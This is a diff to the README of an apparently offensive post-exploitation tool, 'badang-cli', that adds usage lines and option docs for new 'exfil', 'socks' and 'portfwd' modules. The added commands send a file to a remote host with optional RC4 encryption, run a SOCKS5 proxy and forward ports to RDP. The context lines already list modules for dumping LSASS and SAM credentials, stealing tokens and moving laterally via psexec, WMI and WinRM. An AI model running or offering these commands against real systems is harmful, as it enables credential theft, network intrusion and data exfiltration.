@@ -123,9 +123,13 @@ badang-cli postex --module token --pid 672 -x -c                              # 
 badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c
 badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd "cmd /c whoami" -x -c
 badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd "hostname" -x -c
+badang-cli postex --module exfil --file data.zip --remote-host 10.0.0.1 --remote-port 8443 -x -c
+badang-cli postex --module exfil --file data.zip --remote-host 10.0.0.1 --remote-port 8443 --exfil-key s3cret -x -c
+badang-cli postex --module socks --listen-port 1080 -x -c                    # SOCKS5 proxy
+badang-cli postex --module portfwd --listen-port 8080 --remote-host 10.0.0.5 --remote-port 3389 -x -c
 ```
 
-Modules: `lsass` (memdump/snapshot), `sam` (registry/hive), `token` (delegate/session), `psexec` (service/svc), `wmi` (wmic), `winrm` (winrs)
+Modules: `lsass` (memdump/snapshot), `sam` (registry/hive), `token` (delegate/session), `psexec` (service/svc), `wmi` (wmic), `winrm` (winrs), `exfil` (transfer/stage), `socks` (socks5/proxy), `portfwd` (portforward/relay)
 
 ### Unhook
 ```bash
@@ -192,7 +196,7 @@ badang-cli load --payload shellcode.bin
 | `--sleep-obfs` | | Enable sleep obfuscation (comms) |
 | `--check` | | Loader check category: sandbox/debug/vm/all |
 | `--action` | | Loader fail action: report/exit |
-| `--module` | | Post-ex module: lsass/sam/token/psexec/wmi/winrm |
+| `--module` | | Post-ex module: lsass/sam/token/psexec/wmi/winrm/exfil/socks/portfwd |
 | `--remote` | | Remote target host (postex lateral) |
 | `--postex-output` | | Output path (postex creds) |
 | `--postex-user` | | Remote username (postex lateral) |
@@ -200,3 +204,8 @@ badang-cli load --payload shellcode.bin
 | `--postex-cmd` | | Remote command (postex wmi/winrm) |
 | `--postex-service` | | Service name (postex psexec) |
 | `--postex-payload` | | Payload path (postex psexec) |
+| `--file` | | File path (postex exfil) |
+| `--listen-port` | | Listen port (postex socks/portfwd) |
+| `--remote-host` | | Remote host (postex exfil/portfwd) |
+| `--remote-port` | | Remote port (postex exfil/portfwd) |
+| `--exfil-key` | | RC4 encryption key (postex exfil, optional) |
